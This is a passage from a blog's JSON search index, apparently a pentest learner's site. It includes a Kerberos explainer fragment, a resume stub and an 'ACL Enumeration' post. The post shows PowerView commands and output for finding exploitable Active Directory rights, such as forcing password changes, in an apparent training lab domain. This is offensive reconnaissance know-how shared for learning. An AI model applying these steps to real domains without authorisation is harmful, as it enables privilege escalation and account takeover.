(KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\nNB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]\nHow Kerb Auth works! In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.","title":"KERBEROS"},{"content":"My Resume Work Experience Fr334aks Nairobi CTF Player June 2021 to Present\nSkills Programming languages\nTechnical\nEducation Certifications eLearnSecurity Junior Penetration Tester (eJPTv2) eLearnSecurity Dec 2023 Credential ID ","permalink":"http://localhost:1313/about/","summary":"My Resume Work Experience Fr334aks Nairobi CTF Player June 2021 to Present\nSkills Programming languages\nTechnical\nEducation Certifications eLearnSecurity Junior Penetration Tester (eJPTv2) eLearnSecurity Dec 2023 Credential ID ","title":""},{"content":" ACL Enumeration Enumerating ACLs using powerview and getting a graphical representation using BloodHound.\nPowerview Powerview can be used to enumerate ACLs, but the task of going through all the results is extremely time-consuming and likely inaccurate, a good example is when running Find-InterestingDomainACL we you will receive a ton of information back that you\u0026rsquo;d need to go through o make sense of.\nPS C:\\htb\u0026gt; Find-InterestingDomainAcl ObjectDN : DC=INLANEFREIGHT,DC=LOCAL AceQualifier : AccessAllowed ActiveDirectoryRights : ExtendedRight ObjectAceType : ab721a53-1e2f-11d0-9819-00aa0040529b AceFlags : ContainerInherit AceType : AccessAllowedObject InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189 IdentityReferenceName : Exchange Windows Permissions IdentityReferenceDomain : INLANEFREIGHT.LOCAL IdentityReferenceDN : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL IdentityReferenceClass : group ObjectDN : DC=INLANEFREIGHT,DC=LOCAL AceQualifier : AccessAllowed ActiveDirectoryRights : ExtendedRight ObjectAceType : 00299570-246d-11d0-a768-00aa006e0529 AceFlags : ContainerInherit AceType : AccessAllowedObject InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189 IdentityReferenceName : Exchange Windows Permissions IdentityReferenceDomain : INLANEFREIGHT.LOCAL IdentityReferenceDN : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL IdentityReferenceClass : group Going through such data during a time-boxed assessment, you\u0026rsquo;ll never get through it all or find anything interesting before the assessment is over, but there is a better way to utilise PowerView by performing targeted enumeration starting off with user that we have control over.\nCase scenario We have user called wesley we can use this user to find interesting ACL rights that we could take advantage of, first off we need to get the SID of our target user to search effectively.\nPS C:\\htb\u0026gt; Import-Module .\\PowerView.ps1 PS C:\\htb\u0026gt; $sid = Convert-NameToSid wley Later on we can then use the Get-DomainObjectACL function to perform our targeted search, the function we aregoing to be using it\u0026rsquo;s purpose is to find all domain objects that our user has rights over by mapping the user\u0026rsquo;s SID using $sid variable to the SecurityIdentifier property which is what tells us who has the given righ over an object.\nN|B |One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.\nPS C:\\htb\u0026gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1176 ActiveDirectoryRights : ExtendedRight ObjectAceFlags : ObjectAceTypePresent ObjectAceType : 00299570-246d-11d0-a768-00aa006e0529 InheritedObjectAceType : 00000000-0000-0000-0000-000000000000 BinaryLength : 56 AceQualifier : AccessAllowed IsCallback : False OpaqueLength : 0 AccessMask : 256 SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1181 AceType : AccessAllowedObject AceFlags : ContainerInherit IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None AuditFlags : None A good thing to note here is upon enumeration of the ObjectAceType you would come to find our that the user has rights to force change other user\u0026rsquo;s passwords https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password\n","permalink":"http://localhost:1313/posts/active-directory/acls-enumeration/","summary":"ACL Enumeration Enumerating ACLs using powerview and getting a graphical representation using BloodHound.\nPowerview Powerview can be used to enumerate ACLs, but the task of going through all the results is extremely time-consuming and likely inaccurate, a good example is when running Find-InterestingDomainACL we you will receive a ton of information back that you\u0026rsquo;d need to go through o make sense of.\nPS C:\\htb\u0026gt; Find-InterestingDomainAcl ObjectDN : DC=INLANEFREIGHT,DC=LOCAL AceQualifier : AccessAllowed ActiveDirectoryRights : ExtendedRight ObjectAceType : ab721a53-1e2f-11d0-9819-00aa0040529b AceFlags : ContainerInherit AceType : AccessAllowedObject InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189 IdentityReferenceName : Exchange Windows Permissions IdentityReferenceDomain : INLANEFREIGHT.","title":"ACL Enumeration"}]